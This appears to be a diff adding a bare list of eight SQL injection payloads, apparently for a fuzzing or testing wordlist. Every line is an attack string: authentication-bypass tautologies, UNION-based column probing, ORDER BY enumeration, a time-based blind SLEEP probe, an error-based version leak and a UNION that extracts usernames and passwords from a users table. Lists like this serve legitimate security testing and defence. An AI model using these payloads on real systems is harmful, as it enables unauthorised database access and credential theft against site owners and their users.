@@ -1,0 +1,8 @@
+' OR '1'='1
+' OR 1=1 --
+' UNION SELECT NULL, NULL, NULL--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' UNION SELECT username, password FROM users--
+' AND 1=CONVERT(int, (SELECT @@version))--
